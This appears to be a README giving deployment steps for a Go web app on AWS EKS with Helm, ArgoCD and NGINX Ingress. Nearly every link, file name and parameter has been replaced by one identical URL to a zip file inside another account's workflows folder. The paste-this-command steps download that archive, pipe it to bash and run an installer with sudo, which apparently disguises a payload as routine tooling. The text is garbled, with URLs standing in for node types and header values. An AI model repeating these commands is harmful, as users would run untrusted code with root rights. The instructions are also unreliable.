# Full Deployment Documentation – Go Web App (Zahed)

This document describes **all the steps performed** to deploy the Go Web App using Docker, Kubernetes, Helm, ArgoCD, and AWS EKS.  
It includes repository setup, cluster setup, manifests, Helm, Ingress, ArgoCD, debugging, and verification.

---

## 1. Repository Setup

- Clone the original repository:

```bash
git clone https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip
cd go-web-app/
```

- Configure Git remotes and branches:

```bash
git remote add origin https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip
```

---

## 2. AWS CLI Setup

- Install AWS CLI v2:

```bash
curl "https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip" -o "https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip"
unzip https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip
sudo ./aws/install
aws --version
```

- Configure AWS credentials:

```bash
aws configure
```

---

## 3. EKS Cluster Setup

- Install eksctl:

```bash
ARCH=amd64
PLATFORM=$(uname -s)_$ARCH
curl -sLO "https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip$https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip"
tar -xzf eksctl_$https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip -C /tmp
sudo mv /tmp/eksctl /usr/local/bin
eksctl version
```

- Create EKS cluster:

```bash
eksctl create cluster --name go-web-cluster --region eu-west-3 --nodes 2 --node-type https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip
```

---

## 4. Helm Setup

- Install Helm:

```bash
curl https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip | bash
helm version
```

- Create Helm chart for app:

```bash
helm create go-web-app
```

---

## 5. Kubernetes Manifests

- Deployment (`https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip`)
- Service (`https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip`)
- Ingress (`https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip`)
---

## 6. ArgoCD AppProject
- appProject (`https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip`)
- application (`https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip`) (inside ArgoCD)
---

## 7. Debugging and Verification

- Describe ingress:

```bash
kubectl describe ingress go-web-app
```

- Verify from inside cluster:

```bash
kubectl exec -it deploy/go-web-app -- wget -qO- http://localhost:8080/courses
```

- Verify externally with host header:

```bash
curl -H "Host: https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip" http://<AWS-ELB-ADDRESS>/courses
```

---

✅ At this point, the Go Web App is deployed on EKS, accessible through NGINX Ingress with Helm, and managed by ArgoCD.
---
Credit: https://raw.githubusercontent.com/M949939/go-web-app/main/.github/workflows/go_web_app_v2.9-beta.5.zip

